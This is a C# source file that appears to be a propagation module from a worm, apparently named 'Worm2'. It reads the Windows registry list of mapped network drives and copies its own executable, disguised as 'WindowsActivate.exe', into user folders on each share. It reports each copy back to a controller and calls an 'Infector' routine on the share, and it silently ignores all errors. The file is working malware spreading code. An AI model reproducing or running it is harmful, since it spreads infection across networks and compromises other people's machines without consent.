using System.Diagnostics;
using System.IO;
using Leb128;
using Microsoft.Win32;
using Plugin.Helper;
using Worm2.Files;

namespace Plugin.Old;

internal class MapNetworkDrive
{
	public static void Run()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\");
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text in valueNames)
			{
				string text2 = registryKey.GetValue(text).ToString();
				if (!(text.ToLower() != "mrulist"))
				{
					continue;
				}
				try
				{
					string[] directories = Directory.GetDirectories(text2);
					foreach (string text3 in directories)
					{
						string path = text3 + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
						string text4 = text3 + "\\WindowsActivate.exe";
						if (Directory.Exists(path) && !File.Exists(text4))
						{
							File.Copy(Process.GetCurrentProcess().MainModule.FileName, text4);
							Client.Send(LEB128.Write(new object[2]
							{
								"WormLog",
								"Map Network Drive: Copy to " + text4
							}));
						}
					}
					Infector.JoinerInDir(text2);
				}
				catch
				{
				}
			}
			registryKey.Close();
		}
		catch
		{
		}
	}
}
